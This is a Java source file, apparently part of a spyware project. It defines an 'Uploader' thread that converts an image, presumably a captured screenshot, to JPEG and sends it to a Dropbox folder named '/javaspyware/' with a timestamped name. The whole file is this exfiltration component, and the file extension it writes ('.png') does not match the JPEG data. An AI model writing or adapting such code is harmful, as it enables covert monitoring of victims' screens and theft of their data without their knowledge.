package com.company;

import com.dropbox.core.DbxException;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.UploadErrorException;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Uploader extends Thread {
    private BufferedImage image;

    private DbxClientV2 client;
    public Uploader(DbxClientV2 client, BufferedImage image) {

        this.image  = image;
        this.client = client;
    }
    @Override
    public void run() {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
        Date now = new Date();
        String time = formatter.format(now);

        BufferedImage bufferedImage = new BufferedImage(image.getWidth(null), image.getHeight(null),    BufferedImage.TYPE_INT_RGB);
//bufferedImage is the RenderedImage to be written
        Graphics2D g2 = bufferedImage.createGraphics();
        g2.drawImage(image, null, null);
        ByteArrayOutputStream outStream = new ByteArrayOutputStream();
        try {
            ImageIO.write(bufferedImage, "jpg", outStream);
        } catch (IOException e) {
            e.printStackTrace();
        }
        InputStream in = new ByteArrayInputStream(outStream.toByteArray());


        try {
            client.files().uploadBuilder("/javaspyware/"+ time +".png")
                    .uploadAndFinish(in);
        } catch (DbxException | IOException e) {
            e.printStackTrace();
        }


    }
}
